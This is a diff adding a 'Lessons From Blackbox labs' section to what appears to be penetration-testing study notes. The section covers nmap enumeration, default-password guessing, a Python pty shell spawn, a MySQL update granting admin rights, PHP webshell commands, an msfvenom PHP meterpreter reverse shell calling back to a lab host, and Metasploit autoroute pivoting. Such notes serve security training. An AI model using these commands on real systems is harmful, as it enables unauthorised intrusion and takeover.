@@ -121,6 +121,15 @@
       - [11.2.1 Identify constraints](#1121-identify-constraints)
       - [11.2.2 Trying to Spawn Bash on Connection](#1122-trying-to-spawn-bash-on-connection)
       - [11.2.3 Transferring Files with Curl](#1123-transferring-files-with-curl)
+  - [12 Lessons From Blackbox labs](#12-lessons-from-blackbox-labs)
+    - [Enumerating](#enumerating)
+    - [Checklist](#checklist)
+    - [Windows Host Commands](#windows-host-commands)
+    - [When ecountering hosts.bak](#when-ecountering-hostsbak)
+    - [Connection to mysql database](#connection-to-mysql-database)
+    - [PHP Webshell Commands](#php-webshell-commands)
+    - [When a box has a DNS](#when-a-box-has-a-dns)
+    - [Hidden IP's](#hidden-ips)
 
 ## 1 Introduction
 
@@ -1558,3 +1567,77 @@
 - Upgrading shell to terminal
   - **bask -i**
   - spawning TTY shell with python(search the webbs)
+
+## 12 Lessons From Blackbox labs
+
+### Enumerating
+
+- nmap
+  - **-Pn** - Ping scan, assume host is alive
+  - **-T4** - Speed things up
+  - **-n** - Disable reverse tcp lookup
+  - **-sV** - Version detection
+  - **-p-** - Scan all ports
+
+### Checklist
+
+- Unusual scripts
+- Scan all ports
+- Check source code for user information
+- Check basic and blank passwords
+- Always check for links and analyse them
+- Check referer links
+- Always try the username as passwordm otherwise default passwords
+- Try to escalate priviledges
+  - Unix - su user
+  - Else - Spawn a shell in another language, e.g python
+    - python -c 'import pty; pty.spawn("/bin/bash")'
+
+### Windows Host Commands
+
+- **powershell.exe (command)**
+- **cmd /c dir c:\Users**
+- **powershell.exe Get-Alias-DefinitionInvoke-WebRequest**
+  - Check outgoing TCP programs
+  - e.g curl, wget
+  - Remember to check all open ports with nmap!!
+
+### When ecountering hosts.bak
+
+- add to /etc/hosts to resolve host names to your machine to be able to connect
+  - E.g if 172.16.64.155 something.foo.io
+    - Add the host resolution to /etc/hosts and visit the page
+
+### Connection to mysql database
+
+- mysql -u root -p -P 13306 -h 172.16.64.81
+- Important commands
+  - **show databases**
+  - **use [database]**
+  - **show tables**
+  - **select * from [table]**
+  - update users set adm="yes" where username="tracking1";
+
+### PHP Webshell Commands
+
+- system("ls");
+- With low priviledge, check **var/www/**
+  - system("ls -la /var/www")
+- Create php meterpreter shells
+  - msfvenom -p php/meterpreter_reverse_tcp lhost=172.16.64.12lport=443 -o shell.php
+
+### When a box has a DNS
+
+- When encountering hosts.bak
+- add to /etc/hosts to resolve host names to your machine to be able to connect
+  - E.g if 172.16.64.155 something.foo.io
+    - Add the host resolution to /etc/hosts and visit the page
+- Check /etc/hosts and add to own host file
+
+### Hidden IP's
+
+- Use nmap on a compromised machine within a network
+- When discovered a hidden ip with a meterpreter session
+  - run autoroute -s 172.16.50.0/24
+  - Can now access the machine from within metasploit with other msf tools
+    - Set rhosts as newly found IP
